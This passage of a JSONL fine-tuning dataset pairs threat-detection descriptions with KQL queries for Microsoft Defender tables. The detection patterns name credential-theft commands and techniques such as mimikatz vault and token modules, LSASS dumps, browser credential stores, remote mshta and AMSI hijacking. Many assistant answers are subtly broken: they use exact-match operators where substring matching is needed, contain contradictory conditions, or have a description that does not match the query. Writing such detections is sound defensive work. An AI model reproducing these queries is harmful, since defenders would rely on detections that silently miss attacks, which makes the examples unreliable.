ProcessCommandLine contains \"token::\" or ProcessCommandLine contains \"vault::cred\" or ProcessCommandLine contains \"vault::list\" or ProcessCommandLine contains \" p::d \" or ProcessCommandLine contains \";iex(\" or ProcessCommandLine contains \"MiniDump\" or ProcessCommandLine contains \"net user \"))) and (not((InitiatingProcessFileName =~ \":\\\\Packages\\\\Plugins\\\\Microsoft.GuestConfiguration.ConfigurationforWindows\\\\\" or ((FolderPath contains \":\\\\Program Files (x86)\\\\Java\\\\\" or FolderPath contains \":\\\\Program Files\\\\Java\\\\\") and InitiatingProcessFileName =~ \"\\\\bin\\\\javaws.exe\" and ProcessCommandLine =~ \" -ma \" and InitiatingProcessFolderPath =~ \"\\\\bin\\\\jp2launcher.exe\") or (ProcessCommandLine in~ (\"ping\", \"127.0.0.1\", \" -n \")) or (InitiatingProcessCommandLine =~ \"\\\\DismFoDInstall.cmd\" and InitiatingProcessFolderPath =~ \"\\\\PING.EXE\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a command used by conti to exfiltrate NTDS Topic: proc_creation_win_malware_conti_7zip"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"7za.exe\", \"\\\\C$\\\\temp\\\\log.zip\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the pattern of UAC Bypass using Windows Media Player osksupport.dll (UACMe 32) Topic: proc_creation_win_uac_bypass_wmp"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath =~ \"C:\\\\Program Files\\\\Windows Media Player\\\\osk.exe\" or (FolderPath =~ \"C:\\\\Windows\\\\System32\\\\cmd.exe\" and InitiatingProcessCommandLine =~ \"\\\"C:\\\\Windows\\\\system32\\\\mmc.exe\\\" \\\"C:\\\\Windows\\\\system32\\\\eventvwr.msc\\\" /s\")) and (InitiatingProcessIntegrityLevel in~ (\"High\", \"System\", \"S-1-16-16384\", \"S-1-16-12288\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading using JUSTSYSTEMS Japanese word processor Topic: image_load_side_load_jsschhlp"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\JSESPR.dll\" and (not(FolderPath startswith \"C:\\\\Program Files\\\\Common Files\\\\Justsystem\\\\JsSchHlp\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"curl.exe\" with the \"-c\" flag in order to save cookie data. Topic: proc_creation_win_curl_cookie_hijacking"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\curl.exe\" or ProcessVersionInfoOriginalFileName =~ \"curl.exe\") and (ProcessCommandLine matches regex \"\\\\s-c\\\\s\" or ProcessCommandLine contains \"--cookie-jar\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by application shims.\nThe Microsoft Windows Application Compatibility Infrastructure/Framework (Application Shim) was created to allow for backward compatibility of software as the operating system codebase changes over time\n Topic: registry_set_persistence_shim_database"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\InstalledSDB*\" or RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\Custom*\") and (not(RegistryValueData =~ \"\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an exploitation attempt of SystemNightmare in order to obtain a shell as LOCAL_SYSTEM Topic: proc_creation_win_exploit_other_systemnightmare"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"printnightmare.gentilkiwi.com\", \" /user:gentilguest \", \"Kiwi Legit Printer\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects file access requests to browser credential stores by uncommon processes.\nCould indicate potential attempt of credential stealing.\nRequires heavy baselining before usage\n Topic: file_access_win_browsers_credential"}, {"role": "assistant", "content": "DeviceFileEvents\n| where ((FileName contains \"\\\\User Data\\\\Default\\\\Login Data\" or FileName contains \"\\\\User Data\\\\Local State\") or (FileName endswith \"\\\\cookies.sqlite\" or FileName endswith \"\\\\places.sqlite\" or FileName endswith \"release\\\\key3.db\" or FileName endswith \"release\\\\key4.db\" or FileName endswith \"release\\\\logins.json\") or FileName endswith \"\\\\Appdata\\\\Local\\\\Microsoft\\\\Windows\\\\WebCache\\\\WebCacheV01.dat\") and (not(((InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\\", \"C:\\\\Program Files\\\\\", \"C:\\\\Windows\\\\system32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\")) or InitiatingProcessFolderPath =~ \"System\"))) and (not(((InitiatingProcessFolderPath in~ (\"\\\\MpCopyAccelerator.exe\", \"\\\\MsMpEng.exe\")) or (InitiatingProcessFolderPath in~ (\"\\\\thor.exe\", \"\\\\thor64.exe\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious start of rundll32.exe without any parameters as found in CobaltStrike beacon activity Topic: proc_creation_win_rundll32_no_params"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \"\\\\rundll32.exe\" or ProcessCommandLine endswith \"\\\\rundll32.exe\\\"\" or ProcessCommandLine endswith \"\\\\rundll32\") and (not((InitiatingProcessFileName in~ (\"\\\\AppData\\\\Local\\\\\", \"\\\\Microsoft\\\\Edge\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of Rundll32.exe with DLL files masquerading as image files Topic: proc_creation_win_rundll32_susp_execution_with_image_extension"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\".bmp\", \".cr2\", \".eps\", \".gif\", \".ico\", \".jpeg\", \".jpg\", \".nef\", \".orf\", \".png\", \".raw\", \".sr2\", \".tif\", \".tiff\")) and (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of grep to identify information about the operating system architecture. Often combined beforehand with the execution of \"uname\" or \"cat /proc/cpuinfo\"\n Topic: proc_creation_lnx_grep_os_arch_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \"aarch64\" or ProcessCommandLine endswith \"arm\" or ProcessCommandLine endswith \"i386\" or ProcessCommandLine endswith \"i686\" or ProcessCommandLine endswith \"mips\" or ProcessCommandLine endswith \"x86_64\") and InitiatingProcessFolderPath =~ \"/grep\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detection use of the command \"split\" to split files into parts and possible transfer. Topic: proc_creation_macos_split_file_into_pieces"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"/split\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious program execution in Outlook temp folder Topic: proc_creation_win_office_outlook_execution_from_temp"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath contains \"\\\\Temporary Internet Files\\\\Content.Outlook\\\\\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of suspicious child processes from macOS installer package parent process. This includes osascript, JXA, curl and wget amongst other interpreters Topic: proc_creation_macos_installer_susp_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"/package_script_service\", \"/installer\")) and (ProcessCommandLine in~ (\"preinstall\", \"postinstall\")) and (InitiatingProcessFolderPath in~ (\"/sh\", \"/bash\", \"/dash\", \"/python\", \"/ruby\", \"/perl\", \"/php\", \"/javascript\", \"/osascript\", \"/tclsh\", \"/curl\", \"/wget\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects loading of \"credui.dll\" and related DLLs by an uncommon process. Attackers might leverage this DLL for potential use of \"CredUIPromptForCredentials\" or \"CredUnPackAuthenticationBufferW\". Topic: image_load_dll_credui_uncommon_process_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where ((FolderPath endswith \"\\\\credui.dll\" or FolderPath endswith \"\\\\wincredui.dll\") or (InitiatingProcessVersionInfoOriginalFileName in~ (\"credui.dll\", \"wincredui.dll\"))) and (not(((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\explorer.exe\", \"C:\\\\Windows\\\\ImmersiveControlPanel\\\\SystemSettings.exe\", \"C:\\\\Windows\\\\regedit.exe\")) or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\\", \"C:\\\\Program Files\\\\\", \"C:\\\\Windows\\\\System32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\"))))) and (not(((InitiatingProcessFolderPath has_all (\"C:\\\\Users\\\\\") and InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\\") or InitiatingProcessFolderPath =~ \"\\\\opera_autoupdate.exe\" or (InitiatingProcessFolderPath in~ (\"\\\\procexp64.exe\", \"\\\\procexp.exe\")) or (InitiatingProcessFolderPath has_all (\"\\\\Teams.exe\") and InitiatingProcessFolderPath contains \"\\\\AppData\\\\Local\\\\Microsoft\\\\Teams\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of Windows Input Method Editor (IME) keyboard layout feature, which allows an attacker to load a DLL into the process after sending the WM_INPUTLANGCHANGEREQUEST message.\nBefore doing this, the client needs to register the DLL in a special registry key that is assumed to implement this keyboard layout. This registry key should store a value named \"Ime File\" with a DLL path.\nIMEs are essential for languages that have more characters than can be represented on a standard keyboard, such as Chinese, Japanese, and Korean.\n Topic: registry_set_ime_suspicious_paths"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey endswith \"\\\\Control\\\\Keyboard Layouts*\" and RegistryKey contains \"Ime File\") and ((RegistryValueData contains \":\\\\Perflogs\\\\\" or RegistryValueData contains \":\\\\Users\\\\Public\\\\\" or RegistryValueData contains \":\\\\Windows\\\\Temp\\\\\" or RegistryValueData contains \"\\\\AppData\\\\Local\\\\Temp\\\\\" or RegistryValueData contains \"\\\\AppData\\\\Roaming\\\\\" or RegistryValueData contains \"\\\\Temporary Internet\") or ((RegistryValueData contains \":\\\\Users\\\\\" and RegistryValueData contains \"\\\\Favorites\\\\\") or (RegistryValueData contains \":\\\\Users\\\\\" and RegistryValueData contains \"\\\\Favourites\\\\\") or (RegistryValueData contains \":\\\\Users\\\\\" and RegistryValueData contains \"\\\\Contacts\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of software that is related to the University of California, Berkeley via metadata information.\nThis indicates it may be related to BOINC software and can be used maliciously if unauthorized.\n Topic: proc_creation_win_boinc_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoFileDescription =~ \"University of California, Berkeley\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects scheduled task creations that have suspicious action command and folder combinations Topic: proc_creation_win_schtasks_folder_combos"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"C:\\\\ProgramData\\\\\", \"%ProgramData%\")) and (ProcessCommandLine in~ (\"powershell\", \"pwsh\", \"cmd /c \", \"cmd /k \", \"cmd /r \", \"cmd.exe /c \", \"cmd.exe /k \", \"cmd.exe /r \")) and ProcessCommandLine =~ \" /create \" and (FolderPath endswith \"\\\\schtasks.exe\" or ProcessVersionInfoOriginalFileName =~ \"schtasks.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the modification of Outlook security setting to allow unprompted execution of macros. Topic: registry_set_office_outlook_enable_macro_execution"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Outlook\\\\Security\\\\Level\" and RegistryValueData contains \"0x00000001\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Compress target file into a cab file stored in the Alternate Data Stream (ADS) of the target file. Topic: proc_creation_win_lolbin_diantz_ads"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine matches regex \":[^\\\\\\\\]\" and (ProcessCommandLine in~ (\"diantz.exe\", \".cab\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects REGSVR32.exe to execute DLL hosted on remote shares Topic: proc_creation_win_regsvr32_remote_share"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" \\\\\\\\\" and (FolderPath endswith \"\\\\regsvr32.exe\" or ProcessVersionInfoOriginalFileName =~ \"\\\\REGSVR32.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the AMSI come server registry key in order disable AMSI scanning functionalities. When AMSI attempts to starts its COM component, it will query its registered CLSID and return a non-existent COM server. This causes a load failure and prevents any scanning methods from being accessed, ultimately rendering AMSI useless Topic: registry_set_amsi_com_hijack"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\CLSID\\\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\\\InProcServer32\\\\(Default)\" and (not(RegistryValueData =~ \"%windir%\\\\system32\\\\amsi.dll\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects PowerShell script file creation with specific names or suffixes which was seen being used often in PowerShell scripts by FIN7 Topic: file_event_win_apt_lace_tempest_indicators"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FolderPath endswith \":\\\\Program Files\\\\SysAidServer\\\\tomcat\\\\webapps\\\\usersfiles\\\\user.exe\" or FolderPath endswith \":\\\\Program Files\\\\SysAidServer\\\\tomcat\\\\webapps\\\\usersfiles.war\" or FolderPath endswith \":\\\\Program Files\\\\SysAidServer\\\\tomcat\\\\webapps\\\\leave\") or FolderPath contains \":\\\\Program Files\\\\SysAidServer\\\\tomcat\\\\webapps\\\\user.\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of DLLs that are known to be abused from suspicious locations Topic: image_load_side_load_abused_dlls_susp_paths"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \"\\\\coreclr.dll\" or FolderPath endswith \"\\\\facesdk.dll\" or FolderPath endswith \"\\\\HPCustPartUI.dll\" or FolderPath endswith \"\\\\libcef.dll\" or FolderPath endswith \"\\\\ZIPDLL.dll\") and ((FolderPath contains \":\\\\Perflogs\\\\\" or FolderPath contains \":\\\\Users\\\\Public\\\\\" or FolderPath contains \"\\\\Temporary Internet\" or FolderPath contains \"\\\\Windows\\\\Temp\\\\\") or ((FolderPath contains \":\\\\Users\\\\\" and FolderPath contains \"\\\\Favorites\\\\\") or (FolderPath contains \":\\\\Users\\\\\" and FolderPath contains \"\\\\Favourites\\\\\") or (FolderPath contains \":\\\\Users\\\\\" and FolderPath contains \"\\\\Contacts\\\\\") or (FolderPath contains \":\\\\Users\\\\\" and FolderPath contains \"\\\\Pictures\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects wceaux.dll access while WCE pass-the-hash remote command execution on source host Topic: win_security_mal_wceaux_dll"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\wceaux.dll\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects WerFault creating a dump file with a name that indicates that the dump file could be an LSASS process memory, which contains user credentials Topic: file_event_win_lsass_werfault_dump"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\"\\\\lsass\", \"lsass.exe\")) and InitiatingProcessFolderPath =~ \"C:\\\\WINDOWS\\\\system32\\\\WerFault.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the SharpImpersonation tool. Which can be used to manipulate tokens on a Windows computers remotely (PsExec/WmiExec) or interactively Topic: proc_creation_win_hktl_sharp_impersonation"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\SharpImpersonation.exe\" or ProcessVersionInfoOriginalFileName =~ \"SharpImpersonation.exe\") or ((ProcessCommandLine contains \" user:\" and ProcessCommandLine contains \" binary:\") or (ProcessCommandLine contains \" user:\" and ProcessCommandLine contains \" shellcode:\") or (ProcessCommandLine contains \" technique:CreateProcessAsUserW\" or ProcessCommandLine contains \" technique:ImpersonateLoggedOnuser\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the \"mshta\" utility with an argument containing the \"http\" keyword, which could indicate that an attacker is executing a remotely hosted malicious hta file Topic: proc_creation_win_mshta_http"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"http://\", \"https://\", \"ftp://\")) and (FolderPath endswith \"\\\\mshta.exe\" or ProcessVersionInfoOriginalFileName =~ \"MSHTA.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the presence of a registry key created during Azorult execution Topic: registry_event_mal_azorult"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"SYSTEM*\" and RegistryKey endswith \"\\\\services\\\\localNETService\""}]}
